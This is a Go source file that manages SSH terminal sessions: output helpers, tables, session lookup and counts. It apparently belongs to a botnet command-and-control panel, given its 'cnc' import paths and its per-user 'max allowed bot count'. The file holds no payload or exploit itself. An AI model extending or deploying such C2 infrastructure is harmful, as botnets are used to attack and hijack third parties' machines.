package sessions

import (
	"cnc/internal/clients"
	"cnc/internal/database"
	"cnc/internal/master/models/themes"
	"cnc/pkg/sshd"
	"cnc/pkg/sshd/terminal"
	"fmt"
	"github.com/alexeyco/simpletable"
	"strings"
	"time"
)

var (
	sessions = make(map[int]*Session)
)

type Session struct {
	ID int

	*sshd.Terminal
	*database.UserProfile

	Created time.Time
	Theme   *themes.Theme

	LastDistribution map[string]int
}

func (s *Session) Print(a ...interface{}) error {
	_, err := s.Channel.Write([]byte(fmt.Sprint(a...)))
	return err
}

func (s *Session) Printf(format string, val ...any) error {
	_, err := s.Channel.Write([]byte(fmt.Sprintf(format, val...)))
	return err
}

func (s *Session) Title(format string, val ...any) error {
	if n, err := s.Channel.Write([]byte(fmt.Sprintf("\033]0;%s\007", fmt.Sprintf(format, val...)))); err != nil || n <= 0 {
		return err
	}

	return nil
}

//goland:noinspection SpellCheckingInspection
func (s *Session) Printfln(format string, val ...any) error {
	_, err := s.Channel.Write([]byte(fmt.Sprintf(format, val...) + "\r\n"))
	return err
}

func (s *Session) Notification(format string, val ...any) error {
	_, err := s.Channel.Write([]byte(fmt.Sprintf(format, val...) + "\x1b[0m\r\n"))
	return err
}

func (s *Session) Println(a ...interface{}) error {
	_, err := s.Channel.Write([]byte(fmt.Sprint(a...) + "\r\n"))
	return err
}

func (s *Session) Table(table *simpletable.Table, spaces int) error {
	for _, str := range strings.Split(table.String(), "\n") {
		var strLen = terminal.VisualLength([]rune(str))

		if s.Width() < strLen {
			str = str[:s.Width()-1]
		}

		if err := s.Printfln(strings.Repeat(" ", spaces) + str); err != nil {
			return err
		}
	}

	return nil
}

func (s *Session) Clear() error {
	_, err := s.Channel.Write([]byte("\033c"))
	return err
}

func (s *Session) Close() {
	s.Conn.Close()
	s.Remove()
}

// Count gets the max allowed bot count from the user.
func (s *Session) Count() int {
	if s.Clients == -1 || clients.Count() < s.Clients {
		return clients.Count()
	}

	return s.Clients
}

func SessionByName(name string) *Session {
	for _, s := range sessions {
		if s.Name == name {
			return s
		}
	}

	return nil
}

// Count returns the count of the sessions open
func Count() int {
	return len(sessions)
}

// Clone puts all the sessions into a slice
func Clone() []*Session {
	var list []*Session

	for _, session := range sessions {
		list = append(list, session)
	}

	return list
}
